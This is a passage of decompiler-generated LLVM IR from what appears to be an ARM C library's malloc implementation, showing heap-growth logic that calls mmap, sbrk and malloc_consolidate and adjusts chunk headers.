  %v3_e944 = load i32, i32* %v2_e944, align 4
  store i32 %v3_e944, i32* %r1.global-to-local, align 4
  br i1 %v2_e940, label %dec_label_pc_e95c, label %dec_label_pc_e94c

dec_label_pc_e94c:                                ; preds = %dec_label_pc_e93c
  %v0_e94c = call i32 @__malloc_consolidate()
  %v0_e950 = load i32, i32* @sl, align 4
  %v1_e950 = add i32 %v0_e950, -7
  store i32 %v1_e950, i32* %r0.global-to-local, align 4
  %v1_e954 = call i32 @malloc(i32 %v1_e950)
  store i32 %v1_e954, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ed40

dec_label_pc_e95c:                                ; preds = %dec_label_pc_e93c
  %v1_e95c = add i32 %v4_e8f8, 844
  %v2_e95c = inttoptr i32 %v1_e95c to i32*
  %v3_e95c = load i32, i32* %v2_e95c, align 4
  store i32 %v3_e95c, i32* %r3.global-to-local, align 4
  %v3_e960 = icmp ult i32 %v0_e904, %v3_e95c
  %v1_e964 = add i32 %v3_e944, -1
  store i32 %v1_e964, i32* %sb.global-to-local, align 4
  br i1 %v3_e960, label %dec_label_pc_ea38, label %dec_label_pc_e96c

dec_label_pc_e96c:                                ; preds = %dec_label_pc_e95c
  %v1_e96c = add i32 %v4_e8f8, 852
  %v2_e96c = inttoptr i32 %v1_e96c to i32*
  %v3_e96c = load i32, i32* %v2_e96c, align 4
  store i32 %v3_e96c, i32* %r2.global-to-local, align 4
  %v1_e970 = add i32 %v4_e8f8, 848
  %v2_e970 = inttoptr i32 %v1_e970 to i32*
  %v3_e970 = load i32, i32* %v2_e970, align 4
  store i32 %v3_e970, i32* %r3.global-to-local, align 4
  %v6_e978 = icmp slt i32 %v3_e970, %v3_e96c
  br i1 %v6_e978, label %dec_label_pc_e97c, label %dec_label_pc_ea38

dec_label_pc_e97c:                                ; preds = %dec_label_pc_e96c
  %v1_e97c = add i32 %v0_e904, 10
  %v2_e980 = add i32 %v1_e97c, %v3_e944
  store i32 %v2_e980, i32* %r3.global-to-local, align 4
  %v2_e984 = sub i32 0, %v3_e944
  %v3_e984 = and i32 %v2_e980, %v2_e984
  store i32 %v3_e984, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_e984, %v0_e904
  br i1 %tmp211, label %dec_label_pc_e990, label %dec_label_pc_ea38

dec_label_pc_e990:                                ; preds = %dec_label_pc_e97c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_e984, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_e9a8 = call i32 @mmap(i32 0, i32 %v3_e984, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_e9a8, i32* %r0.global-to-local, align 4
  %v7_e9ac = icmp eq i32 %v6_e9a8, -1
  br i1 %v7_e9ac, label %dec_label_pc_e990.dec_label_pc_ea38_crit_edge, label %dec_label_pc_e9b4

dec_label_pc_e990.dec_label_pc_ea38_crit_edge:    ; preds = %dec_label_pc_e990
  %v1_ea5c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_ea38

dec_label_pc_e9b4:                                ; preds = %dec_label_pc_e990
  %v1_e9b4 = urem i32 %v6_e9a8, 8
  store i32 %v1_e9b4, i32* %r2.global-to-local, align 4
  %v2_e9b4 = icmp eq i32 %v1_e9b4, 0
  br i1 %v2_e9b4, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_e9b4
  %v2_e9b8 = sub nsw i32 8, %v1_e9b4
  store i32 %v2_e9b8, i32* %r3.global-to-local, align 4
  %v2_e9bc = load i32, i32* @r4, align 4
  %v3_e9bc = sub i32 %v2_e9bc, %v2_e9b8
  %v3_e9c0 = add i32 %v2_e9b8, %v6_e9a8
  store i32 %v3_e9c0, i32* %lr.global-to-local, align 4
  %v2_e9c8 = or i32 %v3_e9bc, 2
  store i32 %v2_e9c8, i32* %r2.global-to-local, align 4
  %v5_e9d0 = inttoptr i32 %v3_e9c0 to i32*
  store i32 %v2_e9b8, i32* %v5_e9d0, align 4
  %v1_e9d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_e9d4 = load i32, i32* %lr.global-to-local, align 4
  %v3_e9d4 = add i32 %v2_e9d4, 4
  %v4_e9d4 = inttoptr i32 %v3_e9d4 to i32*
  store i32 %v1_e9d4, i32* %v4_e9d4, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_e9b4
  store i32 %v6_e9a8, i32* %lr.global-to-local, align 4
  %v1_e9cc47 = load i32, i32* @r4, align 4
  %v2_e9cc48 = or i32 %v1_e9cc47, 2
  store i32 %v2_e9cc48, i32* %r3.global-to-local, align 4
  %v3_e9d8 = inttoptr i32 %v6_e9a8 to i32*
  store i32 0, i32* %v3_e9d8, align 4
  %v1_e9dc = load i32, i32* %r3.global-to-local, align 4
  %v2_e9dc = load i32, i32* %lr.global-to-local, align 4
  %v3_e9dc = add i32 %v2_e9dc, 4
  %v4_e9dc = inttoptr i32 %v3_e9dc to i32*
  store i32 %v1_e9dc, i32* %v4_e9dc, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r2.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_e9e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_e9e8, i32* %ip.global-to-local, align 4
  %v1_e9ec = add i32 %v4_e9e8, 848
  %v2_e9ec = inttoptr i32 %v1_e9ec to i32*
  %v3_e9ec = load i32, i32* %v2_e9ec, align 4
  store i32 %v3_e9ec, i32* %r3.global-to-local, align 4
  %v1_e9f0 = add i32 %v4_e9e8, 856
  %v2_e9f0 = inttoptr i32 %v1_e9f0 to i32*
  %v3_e9f0 = load i32, i32* %v2_e9f0, align 4
  store i32 %v3_e9f0, i32* %r2.global-to-local, align 4
  %v1_e9f4 = add i32 %v3_e9ec, 1
  store i32 %v1_e9f4, i32* %r3.global-to-local, align 4
  %v7_e9fc = icmp sgt i32 %v1_e9f4, %v3_e9f0
  br i1 %v7_e9fc, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_e9f4, i32* %v2_e9f0, align 4
  %v0_ea00.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_ea00.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_ea00 = phi i32 [ %v4_e9e8, %.thread27 ], [ %v1_ea00.pre, %bb147 ]
  %v0_ea00 = phi i32 [ %v1_e9f4, %.thread27 ], [ %v0_ea00.pre, %bb147 ]
  %v2_ea00 = add i32 %v1_ea00, 848
  %v3_ea00 = inttoptr i32 %v2_ea00 to i32*
  store i32 %v0_ea00, i32* %v3_ea00, align 4
  %v0_ea04 = load i32, i32* %ip.global-to-local, align 4
  %v1_ea04 = add i32 %v0_ea04, 868
  %v2_ea04 = inttoptr i32 %v1_ea04 to i32*
  %v3_ea04 = load i32, i32* %v2_ea04, align 4
  store i32 %v3_ea04, i32* %r3.global-to-local, align 4
  %v1_ea08 = add i32 %v0_ea04, 880
  %v2_ea08 = inttoptr i32 %v1_ea08 to i32*
  %v3_ea08 = load i32, i32* %v2_ea08, align 4
  store i32 %v3_ea08, i32* %r2.global-to-local, align 4
  %v0_ea0c = load i32, i32* @r4, align 4
  %v2_ea0c = add i32 %v0_ea0c, %v3_ea04
  store i32 %v2_ea0c, i32* %r1.global-to-local, align 4
  %v1_ea10 = add i32 %v0_ea04, 872
  %v2_ea10 = inttoptr i32 %v1_ea10 to i32*
  %v3_ea10 = load i32, i32* %v2_ea10, align 4
  store i32 %v3_ea10, i32* %r3.global-to-local, align 4
  %v1_ea18 = add i32 %v0_ea04, 884
  %v2_ea18 = inttoptr i32 %v1_ea18 to i32*
  %v3_ea18 = load i32, i32* %v2_ea18, align 4
  store i32 %v3_ea18, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_ea0c, %v3_ea08
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_ea0c, i32* %v2_ea08, align 4
  %v0_ea20.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_ea20.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_ea20 = phi i32 [ %v0_ea04, %bb148 ], [ %v1_ea20.pre, %bb149 ]
  %v0_ea20 = phi i32 [ %v2_ea0c, %bb148 ], [ %v0_ea20.pre, %bb149 ]
  %v2_ea20 = add i32 %v1_ea20, 868
  %v3_ea20 = inttoptr i32 %v2_ea20 to i32*
  store i32 %v0_ea20, i32* %v3_ea20, align 4
  %v0_ea24 = load i32, i32* %r1.global-to-local, align 4
  %v1_ea24 = load i32, i32* %r3.global-to-local, align 4
  %v2_ea24 = add i32 %v1_ea24, %v0_ea24
  store i32 %v2_ea24, i32* %r1.global-to-local, align 4
  %v1_ea28 = load i32, i32* %r2.global-to-local, align 4
  %v0_ea2c = load i32, i32* %lr.global-to-local, align 4
  %v1_ea2c = add i32 %v0_ea2c, 8
  store i32 %v1_ea2c, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_ea24, %v1_ea28
  br i1 %tmp213, label %bb151, label %dec_label_pc_ed40

bb151:                                            ; preds = %bb150
  %v5_ea30 = load i32, i32* %ip.global-to-local, align 4
  %v6_ea30 = add i32 %v5_ea30, 884
  %v7_ea30 = inttoptr i32 %v6_ea30 to i32*
  store i32 %v2_ea24, i32* %v7_ea30, align 4
  br label %dec_label_pc_ed40

dec_label_pc_ea38:                                ; preds = %dec_label_pc_e97c, %dec_label_pc_e95c, %dec_label_pc_e990.dec_label_pc_ea38_crit_edge, %dec_label_pc_e96c
  %v1_ea5c = phi i32 [ %v1_ea5c.pre, %dec_label_pc_e990.dec_label_pc_ea38_crit_edge ], [ %v0_e904, %dec_label_pc_e96c ], [ %v0_e904, %dec_label_pc_e95c ], [ %v0_e904, %dec_label_pc_e97c ]
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %ip.global-to-local, align 4
  %v4_ea40 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_ea40, i32* %r3.global-to-local, align 4
  %v1_ea44 = add i32 %v4_ea40, 44
  %v2_ea44 = inttoptr i32 %v1_ea44 to i32*
  %v3_ea44 = load i32, i32* %v2_ea44, align 4
  store i32 %v3_ea44, i32* %r0.global-to-local, align 4
  %v1_ea48 = add i32 %v4_ea40, 864
  %v2_ea48 = inttoptr i32 %v1_ea48 to i32*
  %v3_ea48 = load i32, i32* %v2_ea48, align 4
  store i32 %v3_ea48, i32* %r2.global-to-local, align 4
  %v1_ea4c = add i32 %v4_ea40, 840
  %v2_ea4c = inttoptr i32 %v1_ea4c to i32*
  %v3_ea4c = load i32, i32* %v2_ea4c, align 4
  store i32 %v3_ea4c, i32* %r3.global-to-local, align 4
  %v1_ea50 = add i32 %v3_ea44, 4
  %v2_ea50 = inttoptr i32 %v1_ea50 to i32*
  %v3_ea50 = load i32, i32* %v2_ea50, align 4
  store i32 %v3_ea50, i32* %r1.global-to-local, align 4
  %v1_ea58 = urem i32 %v3_ea48, 2
  %v2_ea58 = icmp eq i32 %v1_ea58, 0
  %v1_ea54 = add i32 %v1_ea5c, 16
  %v2_ea5c = add i32 %v1_ea54, %v3_ea4c
  store i32 %v2_ea5c, i32* %r3.global-to-local, align 4
  %v1_ea60 = and i32 %v3_ea50, -4
  store i32 %v1_ea60, i32* @r8, align 4
  br i1 %v2_ea58, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_ea38
  %v3_ea64 = sub i32 %v2_ea5c, %v1_ea60
  store i32 %v3_ea64, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_ea38, %bb152
  %v0_ea68 = phi i32 [ %v2_ea5c, %dec_label_pc_ea38 ], [ %v3_ea64, %bb152 ]
  %v1_ea68 = load i32, i32* %sb.global-to-local, align 4
  %v2_ea68 = add i32 %v1_ea68, %v0_ea68
  store i32 %v2_ea68, i32* %r3.global-to-local, align 4
  %v1_ea6c = sub i32 -1, %v1_ea68
  store i32 %v1_ea6c, i32* %fp.global-to-local, align 4
  %v2_ea70 = and i32 %v2_ea68, %v1_ea6c
  store i32 %v2_ea70, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_ea70, 1
  br i1 %tmp154, label %dec_label_pc_ea94, label %dec_label_pc_ea80

dec_label_pc_ea80:                                ; preds = %bb153
  store i32 %v2_ea70, i32* %r0.global-to-local, align 4
  %v1_ea84 = call i32 @__GI_sbrk(i32 %v2_ea70)
  store i32 %v1_ea84, i32* %r0.global-to-local, align 4
  %v3_ea88 = icmp eq i32 %v1_ea84, -1
  store i32 %v1_ea84, i32* @r4, align 4
  br i1 %v3_ea88, label %dec_label_pc_ea94, label %dec_label_pc_eb00

dec_label_pc_ea94:                                ; preds = %dec_label_pc_ea80, %bb153
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r1.global-to-local, align 4
  %v4_ea9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_ea9c, i32* %r6.global-to-local, align 4
  %v1_eaa0 = add i32 %v4_ea9c, 864
  %v2_eaa0 = inttoptr i32 %v1_eaa0 to i32*
  %v3_eaa0 = load i32, i32* %v2_eaa0, align 4
  store i32 %v3_eaa0, i32* %r3.global-to-local, align 4
  %v1_eaa4 = urem i32 %v3_eaa0, 2
  %v2_eaa4 = icmp eq i32 %v1_eaa4, 0
  br i1 %v2_eaa4, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_ea94
  %v1_eaa8 = load i32, i32* @r8, align 4
  %v2_eaa8 = load i32, i32* %sb.global-to-local, align 4
  %v3_eaa8 = add i32 %v2_eaa8, %v1_eaa8
  %v2_eaac = load i32, i32* @r5, align 4
  %v3_eaac = add i32 %v3_eaa8, %v2_eaac
  store i32 %v3_eaac, i32* %r3.global-to-local, align 4
  %v2_eab0 = load i32, i32* %fp.global-to-local, align 4
  %v3_eab0 = and i32 %v2_eab0, %v3_eaac
  store i32 %v3_eab0, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_ea94
  %v0_eab4.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_eab4 = phi i32 [ %v0_eab4.pr, %.thread29thread-pre-split ], [ %v3_eab0, %bb155 ]
  %v2_eab4 = icmp ugt i32 %v0_eab4, 1048575
  br i1 %v2_eab4, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_eacc = phi i32 [ %v0_eab4, %.thread29 ], [ 1048576, %bb156 ]
  %v1_eabc = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_eacc, %v1_eabc
  br i1 %tmp214, label %dec_label_pc_eac4, label %dec_label_pc_ed28

dec_label_pc_eac4:                                ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_eacc, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_eae0 = call i32 @mmap(i32 0, i32 %v0_eacc, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_eae0, i32* %r0.global-to-local, align 4
  %v3_eae4 = icmp eq i32 %v6_eae0, -1
  %v8_eae4 = icmp eq i32 %v6_eae0, -1
  store i32 %v6_eae0, i32* @r4, align 4
  br i1 %v8_eae4, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_eac4
  %v1_eaec = load i32, i32* %r6.global-to-local, align 4
  %v2_eaec = add i32 %v1_eaec, 864
  %v3_eaec = inttoptr i32 %v2_eaec to i32*
  %v4_eaec = load i32, i32* %v3_eaec, align 4
  %v2_eaf0 = load i32, i32* @r5, align 4
  %v3_eaf0 = add i32 %v2_eaf0, %v6_eae0
  store i32 %v3_eaf0, i32* %r0.global-to-local, align 4
  %v2_eaf4 = and i32 %v4_eaec, -2
  store i32 %v2_eaf4, i32* %r3.global-to-local, align 4
  store i32 %v2_eaf4, i32* %v3_eaec, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_eac4, %bb158
  br i1 %v3_eae4, label %dec_label_pc_eb00, label %dec_label_pc_eb04

dec_label_pc_eb00:                                ; preds = %.thread32, %dec_label_pc_ea80
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eb04

dec_label_pc_eb04:                                ; preds = %.thread32, %dec_label_pc_eb00
  %v0_eb04 = load i32, i32* @r4, align 4
  %v7_eb04 = icmp eq i32 %v0_eb04, -1
  br i1 %v7_eb04, label %dec_label_pc_ed28, label %dec_label_pc_eb0c

dec_label_pc_eb0c:                                ; preds = %dec_label_pc_eb04
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r2.global-to-local, align 4
  %v4_eb14 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_eb14, i32* %ip.global-to-local, align 4
  store i32 %v3_ea44, i32* %r2.global-to-local, align 4
  %v1_eb1c = add i32 %v4_eb14, 872
  %v2_eb1c = inttoptr i32 %v1_eb1c to i32*
  %v3_eb1c = load i32, i32* %v2_eb1c, align 4
  %v1_eb20 = load i32, i32* @r8, align 4
  %v2_eb20 = add i32 %v1_eb20, %v3_ea44
  store i32 %v2_eb20, i32* %r1.global-to-local, align 4
  %v0_eb24 = load i32, i32* @r5, align 4
  %v2_eb24 = add i32 %v0_eb24, %v3_eb1c
  store i32 %v2_eb24, i32* %r3.global-to-local, align 4
  %v9_eb28 = icmp eq i32 %v0_eb04, %v2_eb20
  br i1 %v9_eb28, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_eb0c
  store i32 %v2_eb24, i32* %v2_eb1c, align 4
  br label %dec_label_pc_eb44

bb159:                                            ; preds = %dec_label_pc_eb0c
  %v1_eb2c = load i32, i32* %r0.global-to-local, align 4
  %v8_eb2c = icmp eq i32 %v1_eb2c, -1
  store i32 %v2_eb24, i32* %v2_eb1c, align 4
  br i1 %v8_eb2c, label %.thread34, label %dec_label_pc_eb44

.thread34:                                        ; preds = %bb159
  %v1_eb34 = load i32, i32* @r5, align 4
  %v2_eb34 = load i32, i32* @r8, align 4
  %v3_eb34 = add i32 %v2_eb34, %v1_eb34
  %v2_eb38 = or i32 %v3_eb34, 1
  store i32 %v2_eb38, i32* %r3.global-to-local, align 4
  %v2_eb3c = load i32, i32* %r2.global-to-local, align 4
  %v3_eb3c = add i32 %v2_eb3c, 4
  %v4_eb3c = inttoptr i32 %v3_eb3c to i32*
  store i32 %v2_eb38, i32* %v4_eb3c, align 4
  br label %dec_label_pc_ecbc

dec_label_pc_eb44:                                ; preds = %bb159, %.thread122
  %v0_eb48.pr = load i32, i32* @r8, align 4
  %v0_eb44 = load i32, i32* %ip.global-to-local, align 4
  %v1_eb44 = add i32 %v0_eb44, 864
  %v2_eb44 = inttoptr i32 %v1_eb44 to i32*
  %v3_eb44 = load i32, i32* %v2_eb44, align 4
  store i32 %v3_eb44, i32* %r2.global-to-local, align 4
  %v2_eb48 = icmp eq i32 %v0_eb48.pr, 0
  br i1 %v2_eb48, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_eb44
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_eb44
  %v2_eb50 = urem i32 %v3_eb44, 2
  store i32 %v2_eb50, i32* %r3.global-to-local, align 4
  %v2_eb54 = icmp eq i32 %v2_eb50, 0
  br i1 %v2_eb54, label %.thread40, label %dec_label_pc_eb5c

dec_label_pc_eb5c:                                ; preds = %.thread36
  %v0_eb5c = load i32, i32* @r4, align 4
  %v1_eb5c = load i32, i32* %r1.global-to-local, align 4
  %v3_eb5c = icmp ult i32 %v0_eb5c, %v1_eb5c
  br i1 %v3_eb5c, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_eb5c
  %v2_eb60 = and i32 %v3_eb44, -2
  store i32 %v2_eb60, i32* %r3.global-to-local, align 4
  store i32 %v2_eb60, i32* %v2_eb44, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_eb5c, %.thread37, %.thread36, %bb160
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %ip.global-to-local, align 4
  %v4_eb70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_eb70, i32* @r7, align 4
  %v1_eb74 = add i32 %v4_eb70, 864
  %v2_eb74 = inttoptr i32 %v1_eb74 to i32*
  %v3_eb74 = load i32, i32* %v2_eb74, align 4
  store i32 %v3_eb74, i32* %r3.global-to-local, align 4
  %v1_eb78 = urem i32 %v3_eb74, 2
  store i32 %v1_eb78, i32* @r6, align 4
  %v2_eb78 = icmp eq i32 %v1_eb78, 0
  br i1 %v2_eb78, label %dec_label_pc_ec0c, label %dec_label_pc_eb80

dec_label_pc_eb80:                                ; preds = %.thread40
  %v0_eb80 = load i32, i32* @r8, align 4
  %v2_eb80 = icmp eq i32 %v0_eb80, 0
  br i1 %v2_eb80, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_eb80
  %v2_eb84 = add i32 %v4_eb70, 872
  %v3_eb84 = inttoptr i32 %v2_eb84 to i32*
  %v4_eb84 = load i32, i32* %v3_eb84, align 4
  store i32 %v4_eb84, i32* %r2.global-to-local, align 4
  %v1_eb88 = load i32, i32* %r1.global-to-local, align 4
  %v2_eb88 = load i32, i32* @r4, align 4
  %v3_eb88 = sub i32 %v2_eb88, %v1_eb88
  %v3_eb8c = add i32 %v3_eb88, %v4_eb84
  store i32 %v3_eb8c, i32* %r3.global-to-local, align 4
  store i32 %v3_eb8c, i32* %v3_eb84, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_eb80, %bb161
  %v0_eb94 = load i32, i32* @r4, align 4
  %v1_eb94 = urem i32 %v0_eb94, 8
  store i32 %v1_eb94, i32* %r3.global-to-local, align 4
  %v2_eb94 = icmp eq i32 %v1_eb94, 0
  br i1 %v2_eb94, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_eb98 = sub nsw i32 8, %v1_eb94
  store i32 %v2_eb98, i32* %r3.global-to-local, align 4
  %v3_eb9c = add i32 %v2_eb98, %v0_eb94
  store i32 %v3_eb9c, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_eba4 = phi i32 [ 0, %.thread43 ], [ %v2_eb98, %bb162 ]
  %v1_eba0 = load i32, i32* @r5, align 4
  %v2_eba0 = add i32 %v1_eba0, %v0_eb94
  store i32 %v2_eba0, i32* @r6, align 4
  %v1_eba4 = load i32, i32* @r8, align 4
  %v2_eba4 = add i32 %v2_eba0, %v0_eba4
  %v2_eba8 = add i32 %v2_eba4, %v1_eba4
  store i32 %v2_eba8, i32* %r1.global-to-local, align 4
  %v1_ebac = load i32, i32* %sb.global-to-local, align 4
  %v2_ebac = add i32 %v1_ebac, %v2_eba8
  %v1_ebb0 = load i32, i32* %fp.global-to-local, align 4
  %v2_ebb0 = and i32 %v1_ebb0, %v2_ebac
  store i32 %v2_ebb0, i32* %r2.global-to-local, align 4
  %v2_ebb4 = sub i32 0, %v2_eba0
  store i32 %v2_ebb4, i32* %r3.global-to-local, align 4
  %v2_ebb8 = sub i32 %v2_ebb0, %v2_eba0
  store i32 %v2_ebb8, i32* @r5, align 4
  store i32 %v2_ebb8, i32* %r0.global-to-local, align 4
  br i1 %v2_eb94, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_eb94, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_ebc4 = call i32 @__GI_sbrk(i32 %v2_ebb8)
  store i32 %v1_ebc4, i32* %r0.global-to-local, align 4
  %v3_ebc8 = icmp eq i32 %v1_ebc4, -1
  br i1 %v3_ebc8, label %dec_label_pc_ebd0, label %dec_label_pc_ebe0

dec_label_pc_ebd0:                                ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_ebd4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_ebd4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_ec38

dec_label_pc_ebe0:                                ; preds = %bb164
  %v1_ebe0 = load i32, i32* @r4, align 4
  %v3_ebe0 = icmp ult i32 %v1_ebc4, %v1_ebe0
  br i1 %v3_ebe0, label %dec_label_pc_ebe8, label %dec_label_pc_ec38

dec_label_pc_ebe8:                                ; preds = %dec_label_pc_ebe0
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r0.global-to-local, align 4
  %v4_ebf0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_ebf0, i32* %r2.global-to-local, align 4
  %v1_ebf4 = add i32 %v4_ebf0, 864
  %v2_ebf4 = inttoptr i32 %v1_ebf4 to i32*
  %v3_ebf4 = load i32, i32* %v2_ebf4, align 4
  %v0_ebf8 = load i32, i32* @r6, align 4
  store i32 %v0_ebf8, i32* %r0.global-to-local, align 4
  %v1_ebfc = and i32 %v3_ebf4, -2
  store i32 %v1_ebfc, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_ebfc, i32* %v2_ebf4, align 4
  br label %dec_label_pc_ec38

dec_label_pc_ec0c:                                ; preds = %.thread40
  %v0_ec0c = load i32, i32* %r0.global-to-local, align 4
  %v3_ec0c = icmp eq i32 %v0_ec0c, -1
  br i1 %v3_ec0c, label %dec_label_pc_ec14, label %dec_label_pc_ec30

dec_label_pc_ec14:                                ; preds = %dec_label_pc_ec0c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_ec18 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_ec18, i32* %r0.global-to-local, align 4
  %v0_ec1c = load i32, i32* @r7, align 4
  %v1_ec1c = add i32 %v0_ec1c, 872
  %v2_ec1c = inttoptr i32 %v1_ec1c to i32*
  %v3_ec1c = load i32, i32* %v2_ec1c, align 4
  store i32 %v3_ec1c, i32* %r2.global-to-local, align 4
  %v0_ec20 = load i32, i32* @r4, align 4
  %v0_ec24 = load i32, i32* @r5, align 4
  %v2_ec20 = add i32 %v3_ec1c, %v1_ec18
  %v2_ec24 = sub i32 %v2_ec20, %v0_ec20
  %v2_ec28 = sub i32 %v2_ec24, %v0_ec24
  store i32 %v2_ec28, i32* %r3.global-to-local, align 4
  store i32 %v2_ec28, i32* %v2_ec1c, align 4
  %v0_ec34.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ec30

dec_label_pc_ec30:                                ; preds = %dec_label_pc_ec0c, %dec_label_pc_ec14
  %v0_ec34 = phi i32 [ 0, %dec_label_pc_ec0c ], [ %v0_ec34.pre, %dec_label_pc_ec14 ]
  %v0_ec30 = load i32, i32* @r4, align 4
  store i32 %v0_ec30, i32* @r7, align 4
  store i32 %v0_ec34, i32* @r5, align 4
  br label %dec_label_pc_ec38

dec_label_pc_ec38:                                ; preds = %dec_label_pc_ebe0, %dec_label_pc_ebe8, %dec_label_pc_ebd0, %dec_label_pc_ec30
  %v0_ec38 = load i32, i32* %r0.global-to-local, align 4
  %v7_ec38 = icmp eq i32 %v0_ec38, -1
  br i1 %v7_ec38, label %dec_label_pc_ecbc, label %dec_label_pc_ec40

dec_label_pc_ec40:                                ; preds = %dec_label_pc_ec38
  %v1_ec40 = load i32, i32* @r5, align 4
  %v2_ec40 = add i32 %v1_ec40, %v0_ec38
  %v0_ec44 = load i32, i32* @r7, align 4
  %v2_ec44 = sub i32 %v2_ec40, %v0_ec44
  %v1_ec48 = or i32 %v2_ec44, 1
  %v2_ec4c = add i32 %v0_ec44, 4
  %v3_ec4c = inttoptr i32 %v2_ec4c to i32*
  store i32 %v1_ec48, i32* %v3_ec4c, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r1.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_ec58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_ec58, i32* @r6, align 4
  %v1_ec5c = add i32 %v4_ec58, 872
  %v2_ec5c = inttoptr i32 %v1_ec5c to i32*
  %v3_ec5c = load i32, i32* %v2_ec5c, align 4
  %v0_ec60 = load i32, i32* @r8, align 4
  %v2_ec60 = icmp eq i32 %v0_ec60, 0
  %v0_ec64 = load i32, i32* @r5, align 4
  %v2_ec64 = add i32 %v0_ec64, %v3_ec5c
  store i32 %v2_ec64, i32* %r3.global-to-local, align 4
  store i32 %v2_ec64, i32* %v2_ec5c, align 4
  %v0_ec6c = load i32, i32* @r7, align 4
  %v1_ec6c = load i32, i32* @r6, align 4
  %v2_ec6c = add i32 %v1_ec6c, 44
